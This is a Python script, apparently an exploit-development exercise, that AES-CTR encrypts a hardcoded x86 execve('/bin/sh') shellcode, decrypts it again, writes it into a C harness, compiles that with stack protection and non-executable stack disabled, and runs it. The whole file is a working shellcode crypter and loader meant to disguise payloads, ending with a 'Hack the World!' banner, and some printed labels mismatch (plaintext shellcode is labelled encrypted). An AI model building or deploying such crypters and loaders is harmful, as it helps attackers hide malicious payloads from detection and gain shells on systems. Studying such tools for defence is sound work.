#!/usr/bin/python3

# AES CTR-mode shellcode crypter


import argparse
import secrets
import sys
import string
import pyaes
import binascii
import os

#parser = argparse.ArgumentParser(description='[*] AES CTR-mode shellcode crypter.')
#parser.add_argument('string', metavar='string', type=ascii, help='The string to be converted')

#args = parser.parse_args()


secretsGenerator = secrets.SystemRandom()

c_style_shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/sh

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
encrypted_shellcode = "\xee\x61\x71\x58\x31\xe4\xa0\x9b\x61\x40\xef\x89\x34\xa2\xd7\x0d\x9f\x76\x71\x5a\x97\x77\xe4\x7f\xe0" # encrypted shellcode
                        
iv =86225370279291231266238124133917033753321926857843067389263155507994576978348

def banner():

    print('''
        
        ________________________________________________________
         <The "AEShellCrypter" - Encrypt your shellcode with AES >
        --------------------------------------------------------
            \   ^__^
            \   (oo)\_______
                (__)\       )\/\\
                    ||----w |
                    ||     ||       
        
         ''')

#----------------------------


class Crypter:

    def randomKeyGenerator(self):
        alphabet = string.ascii_letters + string.digits + string.punctuation
        key = ''.join(secrets.choice(alphabet) for i in range(16))
        return str.encode(key) 


    def __init__(self,key=None):
        
        if key is not None:
            self.key = str.encode(key)
            print("[*] Key Provided. Doing magic with it")
        else:
            self.key = self.randomKeyGenerator()
            print("[*] Doing magic with a (pseudo) Random key")
        print("[*] Key: "+self.key.decode())

    def encrypt(self, shellcode):
        #iv = secrets.randbits(256) # for random IV
        aes = pyaes.AESModeOfOperationCTR(self.key, pyaes.Counter(iv))
        crypted_shellcode = aes.encrypt(shellcode)

        print("IV: "+str(iv))

        #print('Encrypted:', crypted_shellcode)

        final_shellcode = ""
        for crypted_shellbyte in bytearray(crypted_shellcode):

            final_shellcode += '\\x' + '%02x' % crypted_shellbyte # \x format

        # print encrypted shellcode in c-style format
        print()
        print(final_shellcode)


    def decrypt(self, final_shellcode):
        print("Decrypted")
        final_shellcode = bytes(final_shellcode, encoding="raw_unicode_escape")

        aes = pyaes.AESModeOfOperationCTR(self.key, pyaes.Counter(iv))
        decrypted_shellcode = aes.decrypt(final_shellcode)

        original_shellcode = ""
        for shellbyte in bytearray(decrypted_shellcode):
            original_shellcode += '\\x' + '%02x' % shellbyte # \x format

        return original_shellcode

        #print(binascii.hexlify(bytearray(final_shellcode.replace("\\x","").encode())))
        

def executeShellcode(original_shellcode):
    

    file = open("shellcode.c", "w")
    file.write('''
        #include<stdio.h>
        #include<string.h>

        unsigned char code[] = \"''' + original_shellcode + '''";

        void main() {

            printf(\"Shellcode Length:  %d\\n\", strlen(code));

            int (*ret)() = (int(*)())code;

            ret();

        }'''
    )
    file.close()
    os.system("gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shellcode 2>/dev/null")
    os.system("./shellcode")


def main():
   
    
    #shellcode = bytearray(c_style_shellcode)
    #print("[*] Shellcode length: "+str(len(shellcode))+"\n")
    #print("[*] Shellcode: "+str(c_style_shellcode)+"\n")

    print("[*] Encrypted Shellcode length: "+str(len(shellcode))+"\n")
    print("[*] Encrypted Shellcode: "+str(c_style_shellcode)+"\n") # dor dynamic c-style use bytes(final_shellcode, encoding="raw_unicode_escape")



    # -------------------KEY-------------- 
    key = "B6*D+/5DQ$MFn<T{"    # example key
    #key = None
    #####################################

    crypter = Crypter(key);
    crypter.encrypt(shellcode)
    original_shellcode = crypter.decrypt(encrypted_shellcode)
    executeShellcode(original_shellcode)








if __name__ == '__main__':

    banner() # displays the program banner
    main()
    print("\n--------------------")
    print("[*] Hack the World!")
    print("--------------------")
    print()
    print()

